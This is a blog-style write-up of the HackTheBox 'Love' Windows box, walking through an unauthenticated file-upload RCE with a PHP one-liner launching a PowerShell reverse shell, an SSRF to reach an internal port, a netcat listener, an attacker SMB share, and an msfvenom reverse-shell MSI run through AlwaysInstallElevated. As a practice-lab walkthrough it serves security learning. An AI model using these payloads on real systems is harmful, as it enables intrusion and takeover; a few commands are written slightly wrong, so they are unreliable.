---
layout: post
current: post
navigation: True
title: Love Writeup
date: 2021-07-01 22:00:00
cover: assets/images/Love_logo.png
class: post-template
subclass: 'post'
author: r3Z3l
---

Easy Windows box from HackTheBox.

starting with nmap scan we found many ports open but many are fake services.
Firstly i enumerated port 80,443,5000 as they were running web services.

---
#voting-exploit

running a voting portal on port 80.
*Two exploits* found for this :
- **Unauthenticated RCE**
- **Authenticated RCE**

## For Unauth RCE
For Unauthenticated RCE we can upload powershell reverse script and execute using powershell.
```<?php echo exec("powershell reverse.ps1") ?>```

so, I get #reverse-shell.

Note: for me first time unauth RCE worked but then it was not working.

## For Auth RCE
I found staging.love.htb  for port 443 nmap scan. So, let's add it in /etc/hosts.

On checking https://staging.love.htb, I found that I can scan any site using this and  nmap shown port 5000 which is forbidden to us.

so let's scan it.

I tried many ways to scan it finally i scanned port 5000 on localhost.
we can get credentials .
![Pasted image 20210601172800.png](assets/images/Pasted image 20210601172800.png)

I tried exploit of searchsploit but it has some things misconfigured so i corrected it.
I'm putting that RCE [here](https://github.io/)

running listner using ``rlwrap nc -lnvp 4444``

so, I got reverse shell as Phoebe user and got  #user-txt  by ``type user.txt``

# Root
For Prive esc i thought to use sharpup.exe as it show min. things
let's upload SharpUp.exe using creating smbserver on our machine
```impacket-smbserver kali . ```    on kali

```copy \\ip\kali\SharpUp.exe SharpUp.exe``` on windows

On executing, it shows that registery permission is 1.
![Pasted image 20210809160738.png](assets/images/Pasted image 20210809160738.png)

This permission allows any user to execute msi file.
So, let's create reverse.msi using msfvenom

```msfvenom -p windows\x64\reverse_tcp LHOST=ip LPORT=4242 -f msi -o reverse.msi```

run it as ```msi /quiet /qn /i reverse.msi```

and you will get reverse shell as admin

so, I got #root-txt  by ``type root.txt``